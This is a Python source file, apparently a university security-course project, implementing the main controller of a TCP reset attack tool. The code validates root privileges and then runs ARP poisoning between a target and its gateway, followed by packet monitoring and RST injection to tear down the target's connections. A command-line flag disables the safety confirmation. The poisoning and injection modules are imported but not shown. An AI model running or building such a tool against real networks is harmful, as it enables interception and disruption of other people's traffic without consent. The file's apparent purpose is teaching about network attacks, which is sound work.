#!/usr/bin/env python3
"""
Main TCP Reset Attack Controller
BUET CSE406 Computer Security Sessional
Educational Purpose Only

DISCLAIMER: This tool is for educational and authorized testing purposes only.
Unauthorized use against systems you do not own is illegal.
"""

import sys
import os
import time
import signal
import threading
import argparse
from datetime import datetime
from pathlib import Path

# Add src directory to Python path
sys.path.append(str(Path(__file__).parent))

from config_manager import ConfigManager
from network_utils import NetworkUtils
from arp_poisoner import ARPPoisoner
from packet_monitor import PacketMonitor

class TCPResetAttack:
    """Main attack controller coordinating all components"""
    
    def __init__(self, config_file=None):
        self.config = ConfigManager(config_file)
        self.arp_poisoner = None
        self.packet_monitor = None
        
        self.running = False
        self.start_time = None
        self.attack_thread = None
        
        # Setup signal handlers for graceful shutdown
        signal.signal(signal.SIGINT, self._signal_handler)
        signal.signal(signal.SIGTERM, self._signal_handler)
        
        print(self._get_banner())
    
    def _get_banner(self):
        """Get attack tool banner"""
        return """
╔══════════════════════════════════════════════════════════════════════════════╗
║                           TCP Reset Attack Tool                              ║
║                        BUET CSE406 Security Project                         ║
║                                                                              ║
║  WARNING: For Educational and Authorized Testing ONLY                       ║
║  Unauthorized use is ILLEGAL and may violate computer security laws         ║
╚══════════════════════════════════════════════════════════════════════════════╝
        """
    
    def _signal_handler(self, signum, frame):
        """Handle interrupt signals for graceful shutdown"""
        print(f"\n[MAIN] Received signal {signum}, initiating graceful shutdown...")
        self.stop_attack()
        sys.exit(0)
    
    def validate_environment(self):
        """Validate system environment and permissions"""
        print("\n[MAIN] Validating environment...")
        
        # Check if running as administrator/root
        if os.name == 'nt':  # Windows
            import ctypes
            if not ctypes.windll.shell32.IsUserAnAdmin():
                print("[ERROR] This tool requires administrator privileges on Windows")
                return False
        else:  # Unix-like
            if os.geteuid() != 0:
                print("[ERROR] This tool requires root privileges on Unix-like systems")
                return False
        
        # Check network connectivity
        target_ip = self.config.get('NETWORK', 'TARGET_IP')
        gateway_ip = self.config.get('NETWORK', 'GATEWAY_IP')
        
        print(f"[MAIN] Testing connectivity to target: {target_ip}")
        if not NetworkUtils.ping_host(target_ip):
            print(f"[WARNING] Cannot ping target {target_ip} - may be normal if host blocks ICMP")
        
        print(f"[MAIN] Testing connectivity to gateway: {gateway_ip}")
        if not NetworkUtils.ping_host(gateway_ip):
            print(f"[ERROR] Cannot reach gateway {gateway_ip}")
            return False
        
        # Verify network interface
        interface = self.config.get('NETWORK', 'INTERFACE')
        interfaces = NetworkUtils.get_network_interfaces()
        interface_names = [iface['name'] for iface in interfaces]
        
        if interface not in interface_names:
            print(f"[ERROR] Network interface '{interface}' not found")
            print(f"[INFO] Available interfaces: {interface_names}")
            return False
        
        print("[MAIN] Environment validation passed")
        return True
    
    def display_configuration(self):
        """Display current attack configuration"""
        print("\n[MAIN] Attack Configuration:")
        print("=" * 50)
        
        target_ip = self.config.get('NETWORK', 'TARGET_IP')
        gateway_ip = self.config.get('NETWORK', 'GATEWAY_IP')
        interface = self.config.get('NETWORK', 'INTERFACE')
        
        print(f"Target IP:          {target_ip}")
        print(f"Gateway IP:         {gateway_ip}")
        print(f"Network Interface:  {interface}")
        print(f"ARP Interval:       {self.config.get_int('ATTACK', 'ARP_INTERVAL')}s")
        print(f"Max RST Packets:    {self.config.get_int('ATTACK', 'MAX_RST_PACKETS')}")
        print(f"Safety Enabled:     {self.config.get_boolean('SAFETY', 'ENABLE_SAFETY')}")
        print(f"Local Only:         {self.config.get_boolean('SAFETY', 'RESTRICT_TO_LOCAL')}")
        
        duration = self.config.get_int('SAFETY', 'MAX_DURATION')
        if duration > 0:
            print(f"Max Duration:       {duration} minutes")
        
        print("=" * 50)
    
    def setup_attack_components(self):
        """Initialize ARP poisoner and packet monitor"""
        print("\n[MAIN] Setting up attack components...")
        
        target_ip = self.config.get('NETWORK', 'TARGET_IP')
        gateway_ip = self.config.get('NETWORK', 'GATEWAY_IP')
        interface = self.config.get('NETWORK', 'INTERFACE')
        arp_interval = self.config.get_int('ATTACK', 'ARP_INTERVAL')
        
        try:
            # Initialize ARP poisoner
            self.arp_poisoner = ARPPoisoner(
                target_ip=target_ip,
                gateway_ip=gateway_ip,
                interface=interface,
                interval=arp_interval
            )
            
            # Initialize packet monitor
            self.packet_monitor = PacketMonitor(
                target_ip=target_ip,
                interface=interface,
                config=self.config
            )
            
            print("[MAIN] Attack components initialized successfully")
            return True
            
        except Exception as e:
            print(f"[ERROR] Failed to setup attack components: {e}")
            return False
    
    def start_attack(self):
        """Start the TCP reset attack"""
        if self.running:
            print("[MAIN] Attack already running")
            return False
        
        print("\n[MAIN] Starting TCP Reset Attack...")
        self.start_time = datetime.now()
        
        try:
            # Start ARP poisoning
            print("[MAIN] Starting ARP poisoning...")
            if not self.arp_poisoner.start_poisoning():
                print("[ERROR] Failed to start ARP poisoning")
                return False
            
            # Wait a bit for ARP poisoning to take effect
            print("[MAIN] Waiting for ARP poisoning to take effect...")
            time.sleep(5)
            
            # Start packet monitoring and RST injection
            print("[MAIN] Starting packet monitoring and RST injection...")
            if not self.packet_monitor.start_monitoring():
                print("[ERROR] Failed to start packet monitoring")
                self.arp_poisoner.stop_poisoning()
                return False
            
            self.running = True
            
            # Start monitoring thread for duration limit
            max_duration = self.config.get_int('SAFETY', 'MAX_DURATION')
            if max_duration > 0:
                self.attack_thread = threading.Thread(
                    target=self._duration_monitor,
                    args=(max_duration * 60,),  # Convert to seconds
                    daemon=True
                )
                self.attack_thread.start()
            
            print("\n" + "=" * 60)
            print("TCP RESET ATTACK ACTIVE")
            print("=" * 60)
            print(f"Started: {self.start_time.strftime('%Y-%m-%d %H:%M:%S')}")
            print("Press Ctrl+C to stop the attack gracefully")
            print("=" * 60)
            
            return True
            
        except Exception as e:
            print(f"[ERROR] Failed to start attack: {e}")
            self.stop_attack()
            return False
    
    def _duration_monitor(self, max_seconds):
        """Monitor attack duration and auto-stop if needed"""
        time.sleep(max_seconds)
        if self.running:
            print(f"\n[MAIN] Maximum duration reached ({max_seconds/60:.0f} minutes), stopping attack...")
            self.stop_attack()
    
    def stop_attack(self):
        """Stop the TCP reset attack gracefully"""
        if not self.running:
            print("[MAIN] Attack not currently running")
            return
        
        print("\n[MAIN] Stopping TCP Reset Attack...")
        self.running = False
        
        # Stop packet monitoring first
        if self.packet_monitor:
            self.packet_monitor.stop_monitoring()
        
        # Stop ARP poisoning and restore ARP tables
        if self.arp_poisoner:
            self.arp_poisoner.stop_poisoning()
        
        # Calculate attack duration
        if self.start_time:
            duration = datetime.now() - self.start_time
            print(f"[MAIN] Attack duration: {duration}")
        
        print("[MAIN] TCP Reset Attack stopped")
    
    def get_attack_status(self):
        """Get current attack status"""
        if not self.running:
            return {"status": "stopped"}
        
        status = {
            "status": "running",
            "start_time": self.start_time.isoformat() if self.start_time else None,
            "duration": str(datetime.now() - self.start_time) if self.start_time else None,
            "arp_poisoning": self.arp_poisoner.is_running() if self.arp_poisoner else False,
            "packet_monitoring": self.packet_monitor.is_running() if self.packet_monitor else False
        }
        
        # Add statistics if available
        if self.packet_monitor:
            stats = self.packet_monitor.rst_injector.get_statistics()
            status.update(stats)
        
        return status
    
    def run_interactive_mode(self):
        """Run attack in interactive mode"""
        try:
            # Validate environment
            if not self.validate_environment():
                print("[ERROR] Environment validation failed")
                return False
            
            # Display configuration
            self.display_configuration()
            
            # Confirm before starting
            if self.config.get_boolean('SAFETY', 'ENABLE_SAFETY'):
                confirm = input("\nProceed with attack? (type 'YES' to confirm): ")
                if confirm != 'YES':
                    print("Attack cancelled by user")
                    return False
            
            # Setup components
            if not self.setup_attack_components():
                return False
            
            # Start attack
            if not self.start_attack():
                return False
            
            # Wait for user interrupt or duration limit
            try:
                while self.running:
                    time.sleep(1)
            except KeyboardInterrupt:
                pass
            
            # Cleanup
            self.stop_attack()
            return True
            
        except Exception as e:
            print(f"[ERROR] Unexpected error: {e}")
            self.stop_attack()
            return False

def main():
    """Main entry point"""
    parser = argparse.ArgumentParser(
        description="TCP Reset Attack Tool - BUET CSE406 Project",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python tcp_reset_attack.py                    # Interactive mode
  python tcp_reset_attack.py --config custom.ini  # Custom configuration
  python tcp_reset_attack.py --target 192.168.1.100 --gateway 192.168.1.1
        """
    )
    
    parser.add_argument(
        '--config', '-c',
        type=str,
        help='Path to configuration file'
    )
    
    parser.add_argument(
        '--target', '-t',
        type=str,
        help='Target IP address'
    )
    
    parser.add_argument(
        '--gateway', '-g',
        type=str,
        help='Gateway IP address'
    )
    
    parser.add_argument(
        '--interface', '-i',
        type=str,
        help='Network interface to use'
    )
    
    parser.add_argument(
        '--duration', '-d',
        type=int,
        help='Attack duration in minutes'
    )
    
    parser.add_argument(
        '--no-safety',
        action='store_true',
        help='Disable safety checks (NOT RECOMMENDED)'
    )
    
    args = parser.parse_args()
    
    try:
        # Initialize attack controller
        attack = TCPResetAttack(args.config)
        
        # Override configuration with command line arguments
        if args.target:
            attack.config.config.set('NETWORK', 'TARGET_IP', args.target)
        
        if args.gateway:
            attack.config.config.set('NETWORK', 'GATEWAY_IP', args.gateway)
        
        if args.interface:
            attack.config.config.set('NETWORK', 'INTERFACE', args.interface)
        
        if args.duration:
            attack.config.config.set('SAFETY', 'MAX_DURATION', str(args.duration))
        
        if args.no_safety:
            attack.config.config.set('SAFETY', 'ENABLE_SAFETY', 'false')
            print("[WARNING] Safety checks disabled!")
        
        # Run attack
        success = attack.run_interactive_mode()
        sys.exit(0 if success else 1)
        
    except KeyboardInterrupt:
        print("\n[MAIN] Interrupted by user")
        sys.exit(1)
    except Exception as e:
        print(f"[ERROR] Fatal error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
